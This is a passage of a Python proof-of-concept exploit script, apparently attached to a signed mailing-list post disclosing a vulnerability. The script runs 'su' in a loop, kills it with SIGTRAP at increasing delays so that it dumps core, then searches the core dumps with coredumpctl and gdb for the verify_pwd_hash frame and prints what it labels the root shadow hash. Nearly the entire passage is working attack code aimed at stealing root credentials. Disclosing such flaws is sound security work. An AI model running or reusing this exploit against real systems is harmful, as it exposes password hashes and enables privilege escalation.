    su = subprocess.Popen(["/usr/bin/su"], stdin=subprocess.PIPE)

    # wait for the su process to initialize and present the 'password' prompt,
    # this is printed directly onto the console so stdout=subprocess.PIPE
    # doesn't allow us to synchronize here
    time.sleep(0.1)

    su.stdin.write(b"stuff\n")
    su.stdin.flush()

    time.sleep(sleeptime)

    su.send_signal(signal.SIGTRAP)
    su.wait()

# writes the most recent core dump into the given file object
def write_cur_dump(fl):
    subprocess.check_call(["coredumpctl", "-q", "dump"], stdout=fl.fileno(), stderr=subprocess.DEVNULL)

# checks the current core dump whether it might contain the password hash of the target user
def check_dump():

    # might take a bit for a core dump to actually appear in coredumpctl
    time.sleep(1)

    # older systemd-coredump don't support --debugger-arguments, therefore,
    # for compatibility, explicitly write out the core file and open it
    # ourselves
    #info = subprocess.check_output(["coredumpctl", "-q", "debug", "--debugger-arguments=--silent --batch -ex bt"])

    with tempfile.NamedTemporaryFile() as fl:
        write_cur_dump(fl)
        info = subprocess.check_output(["gdb", "--silent", "--batch", "-ex", "bt", "su", fl.name])

        warned_about_syms = False

        for line in info.decode("utf8").splitlines():
            if not warned_about_syms:
                if "??" in line or line.find(") from /") != -1:
                    print(f"\n\nit looks like you might be missing some debug symbols:\n\n{line}\n\n")
                    warned_about_syms = True
            for key in ("verify_pwd_hash",):
                #print(line, f"<{key}?>")
                if line.find(key) != -1:
                    print(f"\n\nfound a {key} related dump: {line}\n\n")
                    return True

def check_prereqs():
    if not shutil.which("gdb"):
        print("you need to have 'gdb' installed", file=sys.stderr)
        sys.exit(1)

    if not shutil.which("coredumpctl"):
        print("you need to have 'systemd-coredump' installed", file=sys.stderr)
        sys.exit(1)

    with open("/proc/sys/kernel/core_pattern", "r") as fd:
        core_pattern = fd.read()
        if core_pattern.find("systemd-coredump") == -1:
            print("you need to start and configure 'systemd-coredump'", file=sys.stderr)
            print("HINT: after installing and starting systemd-coredump the first time you also might need to run 'sysctl --system'")
            sys.exit(1)

sleeptime = 0.0

check_prereqs()

while True:

    # keep dumping 'su' with increasing delays until we find something interesting
    run_and_dump(sleeptime)
    sleeptime = round(sleeptime + 0.001, 3)
    print(f"sleeping {sleeptime}s")

    if check_dump():
        with tempfile.NamedTemporaryFile() as fl:
            write_cur_dump(fl)
            subprocess.call(["gdb", "--silent", "--batch", "-ex", "bt", "-ex", "frame function verify_pwd_hash", "-ex", "up", "-ex", "echo likely root shadow hash:\\n", "-ex", "print salt", "su", fl.name])
        while True:
            print("Continue? (y/n) ", flush=True, end = '')
            cont = sys.stdin.readline()
            if not cont or cont.strip() in ("y", "n"):
                break
        if cont != "y":
            break

--3RUAHq2EPah6bw+m--

--tgjPVuxSyQ9yFDFe
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmOi8z0ACgkQFMQFyXGS
NVO/ohAAxKFCCmYiUKIY+c88RfU9xUHJrLDhSE2xvFfnvOZEL9LGDZa0j5fzan6w
fKDGJ2BrztqlndzqNO8XeHAewcMI3SD8Mc8g2KDgGqJks8XeUsRONpPIdr4Oi0jP
GyvQvkj3gGH0tK0dEkex78TGb3w0pwdK1SpifdkgTMw4hQeBpWxFKJzl7+lKG3u0
Cf91cMM0OgfDUGUyi8QSjxUx9FoaPM0Ry/dlySooYi/4IBLPR7txov0TT3/fW6rY
m2UOKZdM/iKRuHVPWclYO+5kcjbOOoTqmyN6P3wZ1n9nY9ibbmH9wKidqEIweqEs
++1TrTK48klFHuwxiYlZqRCUG9KQrboybzNpsSwGnRQyENmWKRiIGP5xaI/nwDd2
RHrSzjhRPz1t1bdsIhd15BnWpXbtrUER6BWjjVMX4QPcmKISF9xnBwclhREyexEj
9b5d3QhsVCaiUN5ujIBkM3Oh68XLJrGVW3CBXM4x1lNSn2bkKEPIK1agq+37B7Lm
Anmu+sxfMdkw2/4c8gr6Zh2fAZrg2PC5ZawCoeFCPDBkb5jm/1w2+MRnLlrRz1DK
8f4u3ntj7rEctk9qFGHzeTTuzUtJeB5zMrHqqn/zjPcak6IbMLQpqhWsyn3Bj3iq
uyq7J6mR3DCLOlPAn2uxaUmVSJAz1dZb0Jo4QXDUbQziBq1rj9I=
=fuEb
-----END PGP SIGNATURE-----

--tgjPVuxSyQ9yFDFe--
